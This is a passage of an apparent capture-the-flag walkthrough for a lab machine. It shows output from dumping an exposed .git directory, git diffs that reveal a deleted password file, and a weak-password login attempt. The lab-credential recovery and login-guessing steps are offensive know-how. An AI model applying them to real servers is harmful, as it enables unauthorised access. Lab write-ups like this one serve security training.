class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/19/</span><span class="hljs-number">36</span>b7f0b8bc34642423c19738fab503a9d967de [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/67/</span><span class="hljs-number">3</span>b2216187128dc73088ac5df036e854798c68f [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/info/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/pack/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/f7/</span>cc50a34b65f1c6cf3c8bd10e2b78271c348e35 [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/2d/</span>ce93ea08ed9059be0a838c6bcf62b7b5c28907 [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/f9/</span>f7d8ba3292488a6e7f9fa21d0968ca7bbd6637 [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/f6/</span><span class="hljs-number">86416</span>a62f2dc219fc3d6168fd0ae38516f6422 [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/b8/</span><span class="hljs-number">295</span>d6c67f5f2df8a3649af13bf6867b221cd17 [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/ab/</span>d028b26786a20ba6f9dfe4de5305b7341c2395 [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/90/</span><span class="hljs-number">15</span>a7a32ca0681be64471d3ac2f8c1f24c1040d [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/bd/</span><span class="hljs-number">9990</span>a1d46f17332711ccdf1d5ca32d584ae5c3 [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>HEAD [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/i</span>ndex [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>logs/ [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>logs/HEAD [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs/</span>heads/ [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs/</span>heads/master [<span class="hljs-number">200</span>]<br>[-] Sanitizing .git/config<br>[-] Running git checkout .<br>Updated <span class="hljs-number">1</span> path from the index<br>                                                            <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql">┌──(root㉿kaada)<span class="hljs-operator">-</span>[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop<span class="hljs-operator">/</span>MM]<br>└─# git log                                 <br><span class="hljs-keyword">commit</span> <span class="hljs-number">1936</span>b7f0b8bc34642423c19738fab503a9d967de (HEAD <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> master)<br>Author: mingmingjiu <span class="hljs-operator">&lt;</span>mingmingjiu<span class="hljs-variable">@mm</span>.dsz<span class="hljs-operator">&gt;</span><br><span class="hljs-type">Date</span>:   Sun Apr <span class="hljs-number">19</span> <span class="hljs-number">00</span>:<span class="hljs-number">10</span>:<span class="hljs-number">25</span> <span class="hljs-number">2026</span> <span class="hljs-number">-0400</span><br><br>    <span class="hljs-number">4</span><br><br><span class="hljs-keyword">commit</span> b8295d6c67f5f2df8a3649af13bf6867b221cd17<br>Author: mingmingjiu <span class="hljs-operator">&lt;</span>mingmingjiu<span class="hljs-variable">@mm</span>.dsz<span class="hljs-operator">&gt;</span><br><span class="hljs-type">Date</span>:   Sun Apr <span class="hljs-number">19</span> <span class="hljs-number">00</span>:<span class="hljs-number">08</span>:<span class="hljs-number">12</span> <span class="hljs-number">2026</span> <span class="hljs-number">-0400</span><br><br>    <span class="hljs-number">3</span><br><br><span class="hljs-keyword">commit</span> f7cc50a34b65f1c6cf3c8bd10e2b78271c348e35<br>Author: mingmingjiu <span class="hljs-operator">&lt;</span>mingmingjiu<span class="hljs-variable">@mm</span>.dsz<span class="hljs-operator">&gt;</span><br><span class="hljs-type">Date</span>:   Sun Apr <span class="hljs-number">19</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span>:<span class="hljs-number">59</span> <span class="hljs-number">2026</span> <span class="hljs-number">-0400</span><br><br>    <span class="hljs-number">2</span><br><br><span class="hljs-keyword">commit</span> f9f7d8ba3292488a6e7f9fa21d0968ca7bbd6637<br>Author: mingmingjiu <span class="hljs-operator">&lt;</span>mingmingjiu<span class="hljs-variable">@mm</span>.dsz<span class="hljs-operator">&gt;</span><br><span class="hljs-type">Date</span>:   Sun Apr <span class="hljs-number">19</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span>:<span class="hljs-number">17</span> <span class="hljs-number">2026</span> <span class="hljs-number">-0400</span><br><br>    <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+
+<p>查看git日志,使用diff对比不同提交.</p>
+<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><code class="hljs ldif">┌──(root㉿kaada)-[/home/kali/Desktop/MM]<br>└─<span class="hljs-comment"># git diff 1936b7f0b8bc34642423c19738fab503a9d967de b8295d6c67f5f2df8a3649af13bf6867b221cd17</span><br>diff --git a/index.html b/index.html<br>index bd9990a..9015a7a 100644<br><span class="hljs-literal">-</span>-- a/index.html<br>+++ b/index.html<br>@@ -1,110 +1 @@<br><span class="hljs-literal">-</span>&lt;!DOCTYPE html&gt;<br><span class="hljs-literal">-</span>&lt;html lang=&quot;en&quot;&gt;<br><span class="hljs-literal">-</span>&lt;head&gt;<br><span class="hljs-literal">-</span>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br><span class="hljs-literal">-</span>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br><span class="hljs-literal">-</span>    &lt;title&gt;Hi&lt;/title&gt;<br><span class="hljs-literal">-</span>    &lt;style&gt;<br><span class="hljs-literal">-</span>        * &#123;<br><span class="hljs-literal">-</span>            margin: 0;<br><span class="hljs-literal">-</span>            padding: 0;<br><span class="hljs-literal">-</span>            box-sizing: border-box;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        body &#123;<br><span class="hljs-literal">-</span>            font-family: &#x27;Georgia&#x27;, &#x27;Times New Roman&#x27;, serif;<br><span class="hljs-literal">-</span>            background: linear-gradient(135deg, <span class="hljs-comment">#2c3e50 0%, #4a6491 100%);</span><br><span class="hljs-literal">-</span>            min-height: 100vh;<br><span class="hljs-literal">-</span>            display: flex;<br><span class="hljs-literal">-</span>            justify-content: center;<br><span class="hljs-literal">-</span>            align-items: center;<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#f5f5f5;</span><br><span class="hljs-literal">-</span>            padding: 20px;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .container &#123;<br><span class="hljs-literal">-</span>            text-align: center;<br><span class="hljs-literal">-</span>            max-width: 800px;<br><span class="hljs-literal">-</span>            width: 100%;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .quote-box &#123;<br><span class="hljs-literal">-</span>            background: rgba(255, 255, 255, 0.08);<br><span class="hljs-literal">-</span>            border-radius: 15px;<br><span class="hljs-literal">-</span>            padding: 50px 40px;<br><span class="hljs-literal">-</span>            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);<br><span class="hljs-literal">-</span>            border: 1px solid rgba(255, 255, 255, 0.1);<br><span class="hljs-literal">-</span>            backdrop-filter: blur(5px);<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .quote &#123;<br><span class="hljs-literal">-</span>            font-size: 2.2rem;<br><span class="hljs-literal">-</span>            line-height: 1.5;<br><span class="hljs-literal">-</span>            font-weight: 300;<br><span class="hljs-literal">-</span>            margin-bottom: 30px;<br><span class="hljs-literal">-</span>            position: relative;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .quote:before, .quote:after &#123;<br><span class="hljs-literal">-</span>            font-size: 4rem;<br><span class="hljs-literal">-</span>            color: rgba(255, 255, 255, 0.2);<br><span class="hljs-literal">-</span>            position: absolute;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .quote:before &#123;<br><span class="hljs-literal">-</span>            content: &quot;“&quot;;<br><span class="hljs-literal">-</span>            top: -20px;<br><span class="hljs-literal">-</span>            left: -15px;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .quote:after &#123;<br><span class="hljs-literal">-</span>            content: &quot;”&quot;;<br><span class="hljs-literal">-</span>            bottom: -50px;<br><span class="hljs-literal">-</span>            right: -15px;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .author &#123;<br><span class="hljs-literal">-</span>            font-size: 1.2rem;<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#a8d0e6;</span><br><span class="hljs-literal">-</span>            font-style: italic;<br><span class="hljs-literal">-</span>            margin-top: 30px;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .highlight &#123;<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#f76c6c;</span><br><span class="hljs-literal">-</span>            font-weight: 400;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .footer &#123;<br><span class="hljs-literal">-</span>            margin-top: 40px;<br><span class="hljs-literal">-</span>            font-size: 0.9rem;<br><span class="hljs-literal">-</span>            color: rgba(255, 255, 255, 0.4);<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        @media (max-width: 768px) &#123;<br><span class="hljs-literal">-</span>            .quote-box &#123;<br><span class="hljs-literal">-</span>                padding: 30px 20px;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>            <br><span class="hljs-literal">-</span>            .quote &#123;<br><span class="hljs-literal">-</span>                font-size: 1.8rem;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>            <br><span class="hljs-literal">-</span>            .quote:before, .quote:after &#123;<br><span class="hljs-literal">-</span>                font-size: 3rem;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>    &lt;/style&gt;<br><span class="hljs-literal">-</span>&lt;/head&gt;<br><span class="hljs-literal">-</span>&lt;body&gt;<br><span class="hljs-literal">-</span>    &lt;div class=&quot;container&quot;&gt;<br><span class="hljs-literal">-</span>        &lt;div class=&quot;quote-box&quot;&gt;<br><span class="hljs-literal">-</span>            &lt;p class=&quot;quote&quot;&gt;<br><span class="hljs-literal">-</span>                The only way to do great work is to love what you do. <br><span class="hljs-literal">-</span>                If you haven&#x27;t found it yet, keep looking. Don&#x27;t settle.<br><span class="hljs-literal">-</span>            &lt;/p&gt;<br><span class="hljs-literal">-</span>            &lt;p class=&quot;author&quot;&gt;— Steve Jobs&lt;/p&gt;<br><span class="hljs-literal">-</span>        &lt;/div&gt;<br><span class="hljs-literal">-</span>    &lt;/div&gt;<br><span class="hljs-literal">-</span>&lt;/body&gt;<br><span class="hljs-literal">-</span>&lt;/html&gt;<br>+index<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#a8d0e6;</span><br><span class="hljs-literal">-</span>            font-style: italic;<br><span class="hljs-literal">-</span>            margin-top: 30px;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .highlight &#123;<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#f76c6c;</span><br><span class="hljs-literal">-</span>            font-weight: 400;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .footer &#123;<br><span class="hljs-literal">-</span>            margin-top: 40px;<br><span class="hljs-literal">-</span>            font-size: 0.9rem;<br><span class="hljs-literal">-</span>            color: rgba(255, 255, 255, 0.4);<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        @media (max-width: 768px) &#123;<br><span class="hljs-literal">-</span>            .quote-box &#123;<br><span class="hljs-literal">-</span>                padding: 30px 20px;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>            <br><span class="hljs-literal">-</span>            .quote &#123;<br><span class="hljs-literal">-</span>                font-size: 1.8rem;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>            <br><span class="hljs-literal">-</span>            .quote:before, .quote:after &#123;<br><span class="hljs-literal">-</span>                font-size: 3rem;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>    &lt;/style&gt;<br><span class="hljs-literal">-</span>&lt;/head&gt;<br><span class="hljs-literal">-</span>&lt;body&gt;<br><span class="hljs-literal">-</span>    &lt;div class=&quot;container&quot;&gt;<br><span class="hljs-literal">-</span>        &lt;div class=&quot;quote-box&quot;&gt;<br><span class="hljs-literal">-</span>            &lt;p class=&quot;quote&quot;&gt;<br><span class="hljs-literal">-</span>                The only way to do great work is to love what you do. <br><span class="hljs-literal">-</span>                If you haven&#x27;t found it yet, keep looking. Don&#x27;t settle.<br><span class="hljs-literal">-</span>            &lt;/p&gt;<br><span class="hljs-literal">-</span>            &lt;p class=&quot;author&quot;&gt;— Steve Jobs&lt;/p&gt;<br><span class="hljs-literal">-</span>        &lt;/div&gt;<br><span class="hljs-literal">-</span>    &lt;/div&gt;<br><span class="hljs-literal">-</span>&lt;/body&gt;<br><span class="hljs-literal">-</span>&lt;/html&gt;<br>+index<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#a8d0e6;</span><br><span class="hljs-literal">-</span>            font-style: italic;<br><span class="hljs-literal">-</span>            margin-top: 30px;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .highlight &#123;<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#f76c6c;</span><br><span class="hljs-literal">-</span>            font-weight: 400;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .footer &#123;<br><span class="hljs-literal">-</span>            margin-top: 40px;<br><span class="hljs-literal">-</span>            font-size: 0.9rem;<br><span class="hljs-literal">-</span>            color: rgba(255, 255, 255, 0.4);<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        @media (max-width: 768px) &#123;<br><span class="hljs-literal">-</span>            .quote-box &#123;<br><span class="hljs-literal">-</span>                padding: 30px 20px;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>            <br><span class="hljs-literal">-</span>            .quote &#123;<br><span class="hljs-literal">-</span>                font-size: 1.8rem;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>            <br><span class="hljs-literal">-</span>            .quote:before, .quote:after &#123;<br><span class="hljs-literal">-</span>                font-size: 3rem;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>    &lt;/style&gt;<br><span class="hljs-literal">-</span>&lt;/head&gt;<br><span class="hljs-literal">-</span>&lt;body&gt;<br><span class="hljs-literal">-</span>    &lt;div class=&quot;container&quot;&gt;<br><span class="hljs-literal">-</span>        &lt;div class=&quot;quote-box&quot;&gt;<br><span class="hljs-literal">-</span>            &lt;p class=&quot;quote&quot;&gt;<br><span class="hljs-literal">-</span>                The only way to do great work is to love what you do. <br><span class="hljs-literal">-</span>                If you haven&#x27;t found it yet, keep looking. Don&#x27;t settle.<br><span class="hljs-literal">-</span>            &lt;/p&gt;<br><span class="hljs-literal">-</span>            &lt;p class=&quot;author&quot;&gt;— Steve Jobs&lt;/p&gt;<br><span class="hljs-literal">-</span>        &lt;/div&gt;<br><span class="hljs-literal">-</span>    &lt;/div&gt;<br><span class="hljs-literal">-</span>&lt;/body&gt;<br><span class="hljs-literal">-</span>&lt;/html&gt;<br>+index<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#a8d0e6;</span><br><span class="hljs-literal">-</span>            font-style: italic;<br><span class="hljs-literal">-</span>            margin-top: 30px;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .highlight &#123;<br><span class="hljs-literal">-</span>            color: <span class="hljs-comment">#f76c6c;</span><br><span class="hljs-literal">-</span>            font-weight: 400;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        .footer &#123;<br><span class="hljs-literal">-</span>            margin-top: 40px;<br><span class="hljs-literal">-</span>            font-size: 0.9rem;<br><span class="hljs-literal">-</span>            color: rgba(255, 255, 255, 0.4);<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>        <br><span class="hljs-literal">-</span>        @media (max-width: 768px) &#123;<br><span class="hljs-literal">-</span>            .quote-box &#123;<br><span class="hljs-literal">-</span>                padding: 30px 20px;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>            <br><span class="hljs-literal">-</span>            .quote &#123;<br><span class="hljs-literal">-</span>                font-size: 1.8rem;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>            <br><span class="hljs-literal">-</span>            .quote:before, .quote:after &#123;<br><span class="hljs-literal">-</span>                font-size: 3rem;<br><span class="hljs-literal">-</span>            &#125;<br><span class="hljs-literal">-</span>        &#125;<br><span class="hljs-literal">-</span>    &lt;/style&gt;<br><span class="hljs-literal">-</span>&lt;/head&gt;<br><span class="hljs-literal">-</span>&lt;body&gt;<br><span class="hljs-literal">-</span>    &lt;div class=&quot;container&quot;&gt;<br><span class="hljs-literal">-</span>        &lt;div class=&quot;quote-box&quot;&gt;<br><span class="hljs-literal">-</span>            &lt;p class=&quot;quote&quot;&gt;<br><span class="hljs-literal">-</span>                The only way to do great work is to love what you do. <br><span class="hljs-literal">-</span>                If you haven&#x27;t found it yet, keep looking. Don&#x27;t settle.<br><span class="hljs-literal">-</span>            &lt;/p&gt;<br><span class="hljs-literal">-</span>            &lt;p class=&quot;author&quot;&gt;— Steve Jobs&lt;/p&gt;<br><span class="hljs-literal">-</span>        &lt;/div&gt;<br><span class="hljs-literal">-</span>    &lt;/div&gt;<br><span class="hljs-literal">-</span>&lt;/body&gt;<br><span class="hljs-literal">-</span>&lt;/html&gt;<br>+index<br>(END)<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">┌──(root㉿kaada)-<span class="hljs-selector-attr">[/home/kali/Desktop/MM]</span><br>└─# git diff f7cc50a34b65f1c6cf3c8bd10e2b78271c348e35 f9f7d8ba3292488a6e7f9fa21d0968ca7bbd6637<br>diff <span class="hljs-attr">--git</span> <span class="hljs-selector-tag">a</span>/pass<span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">b</span>/pass<span class="hljs-selector-class">.txt</span><br>deleted file mode <span class="hljs-number">100644</span><br>index <span class="hljs-number">673</span>b221..<span class="hljs-number">0000000</span><br>--- <span class="hljs-selector-tag">a</span>/pass<span class="hljs-selector-class">.txt</span><br>+++ /dev/null<br>@@ -<span class="hljs-number">1</span> +<span class="hljs-number">0</span>,<span class="hljs-number">0</span> @@<br><span class="hljs-attribute">-password</span>:sublarge<br><br></code></pre></td></tr></table></figure>
+
+<p>泄露口令,sublarge,同时泄露用户名,mingmingjiu,以及域名,mm.dsz</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.56.60</span> mm.dsz<br></code></pre></td></tr></table></figure>
+
+<p>访问域名mm.dsz,有个登录界面</p>
+<p><img src="/2026/04/24/Mazesec-MM/vmware_gRlX8WkYNz.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用刚刚得到的mingmingjiu:12345678弱口令爆破登录</p>
+<p><img src="/2026/04/24/Mazesec-MM/vmware_TAppVdhfDZ.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是前端按钮是disable的.,执行不了命令,使用POST传参也无果.(后面会发现这只是个空壳界面)</p>
+<p>尝试登录VNC</p>
